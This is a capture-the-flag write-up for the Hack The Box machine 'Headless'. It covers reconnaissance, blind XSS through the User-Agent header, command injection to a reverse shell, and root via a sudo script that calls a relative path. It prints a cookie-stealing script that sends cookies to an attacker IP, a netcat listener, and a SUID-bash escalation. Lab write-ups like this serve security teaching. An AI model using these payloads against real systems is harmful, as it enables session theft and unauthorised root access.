---------------
Headless is an easy-difficulty Linux machine that features a Python Werkzeug server hosting a website. The website has a customer support form, which is found to be vulnerable to blind Cross-Site Scripting (XSS) via the User-Agent header. This vulnerability is leveraged to steal an admin cookie, which is then used to access the administrator dashboard. The page is vulnerable to command injection, leading to a reverse shell on the box. Enumerating the user’s mail reveals a script that does not use absolute paths, which is leveraged to get a shell as root.

## Walkthrough

### Reconnaissance

The first thing to do is **scan for open ports** in the target machine, I will divide this in 3 phases:
1. Scan for **open ports**
2. Scan for **services** in these open ports
3. Scan for **vulnerabilities** in these services

&NewLine;
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.11.8 -p- -T4 --min-rate 5000 -oG all_ports.txt --open -n -Pn
```

![Port_Scan](/assets/Headless/Pasted image 20240731154855.png)
&NewLine;
There are two open ports:
- **22/tcp**
- **5000/tcp**
&NewLine;
Even though we can see that nmap is reporting a service, it is only given by the port number, not by any check, so let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.8 -p 22,5000 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A -v
```

![Service_Scan](/assets/Headless/Pasted image 20240731160318.png)
&NewLine;
We can see that the two services correspond to:
+ **22/tcp ssh**
+ **5000/tcp http**
&NewLine;
Although nmap is reporting us that the service might be upnp, we can see html code in the response. Some interesting pieces of information are the version of **Werkzeug**, **Python** and the ***is_admin* cookie**.

Let's scan for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.8 -p 22,5000 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn -v
```

From this scan we got no relevant information.
&NewLine;
Let's scan this website for **directories and files** it may contain:

```bash
gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_dir_and_file_enum_5000.txt -t 25 -r
```

![Gobuster_Scan](/assets/Headless/Pasted image 20240731170119.png)
&NewLine;
The **dashboard** website **requires some kind of authorization**, which may be related to the ***is_admin* cookie**.

![Unauthorized](/assets/Headless/Pasted image 20240731170210.png)
&NewLine;
Before exploring the website, let's add an entry in ***/etc/hosts*** for this machine:

![etc_hosts](/assets/Headless/Pasted image 20240731161705.png)
&NewLine;
&NewLine;
### Foothold

The first thing we see when exploring the website is a countdown:

![Welcome](/assets/Headless/Pasted image 20240731162251.png)
&NewLine;
By clicking on the link we get to a **support form**, we can try to **inject** HTML code with JavaScript code in this form, we will use it to **steal the reader's cookies**:

```HTML
<script>
	var i=new Image();
	i.src="http://10.10.16.4/?cookie="+btoa(document.cookie);
</script>
```
&NewLine;
This code will create a variable that is supposed to be an image, the image will be requested to our server along containing the user cookies encoded in base64.

![Contact](/assets/Headless/Pasted image 20240731163301.png)
&NewLine;
Before clicking on submit, let's open a **web server** to receive the request:
```python
sudo python3 -m http.server 80
```

After submitting the form, we receive this notification:

![Hacking](/assets/Headless/Pasted image 20240731162643.png)
&NewLine;
Our code has not been submitted to the target, however we can see that the website has gathered and send some **information available in the HTTP request to the administrators**. Among all of these information, there is one piece that we can modify, the **User-Agent**. Let's use BurpSuite to do this:

![XSS](/assets/Headless/Pasted image 20240731163634.png])

After a few moments, we receive a **request to our web server**:
![Cookie_Steal](/assets/Headless/Pasted image 20240731164047.png)
&NewLine;
We should now decode the cookie:

```bash
echo -n "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
```

![Cookie_Decode](/assets/Headless/Pasted image 20240731164143.png)
&NewLine;
We can inject this cookie into our browser to **impersonate the administrator**:

![Cookie_injection](/assets/Headless/Pasted image 20240731164319.png)
&NewLine;
Now we can navigate to the dashboard website to see the **administrator dashboard**:

![Dashboard](/assets/Headless/Pasted image 20240731170332.png)
&NewLine;
We can see that the website is used to generate a report based on the health of the website, when we click the *Generate Report* button we can see the message *Systems are up and running!* which may imply that this website is executing an **OS command**. Let's try to send our attacker machine a ping with BurpSuite:

```python
sudo tcpdump -vvvXi tun0 icmp
```

![ping](/assets/Headless/Pasted image 20240731170920.png)
![tcpdump](/assets/Headless/Pasted image 20240731170935.png)
&NewLine;
It worked! Let's now try to get a **reverse shell**:

```bash
sudo rlwrap nc -nlvp 443
```

![shell_burp](/assets/Headless/Pasted image 20240731171312.png)
&NewLine;
We received a shell:

![shell](/assets/Headless/Pasted image 20240731171422.png)
&NewLine;
Let's **sanitize the shell**:

```bash
Pwned> script /dev/null -c /bin/bash
#Ctrl+Z
Hacker> stty raw -echo; fg
Pwned> reset xterm
Pwned and Hacked> stty size #Para comprobar el número de filas y columnas del terminal
Pwned> stty rows $rows columns $columns
export TERM=xterm
export SHELL=bash
```
&NewLine;
![whoami](/assets/Headless/Pasted image 20240731171720.png)
&NewLine;
We are logged in as *dvir*, so we got the **user flag**.

![user_flag](/assets/Headless/Pasted image 20240731171757.png)
&NewLine;
&NewLine;
### Privilege Escalation

During the initial reconnaissance, we discovered that user *dvir* can run the script */usr/bin/syscheck* using `sudo`.

![sudoers](/assets/Headless/Pasted image 20240731171938.png)
&NewLine;
This script, among other things, **run the *initdb.sh* file* indicated by **relative path**:

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```
&NewLine;
&NewLine;
We can leverage this to **create our *initdb.sh* file** and **run it with sudo privileges**:

```bash
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
```
&NewLine;
&NewLine;
We can now check that the */bin/bash* binary has ***SUID* permission**:

![SUID](/assets/Headless/Pasted image 20240731172912.png)
&NewLine;
And to finally **gain privileges** we can run:

```bash
bash -p
```

&NewLine;
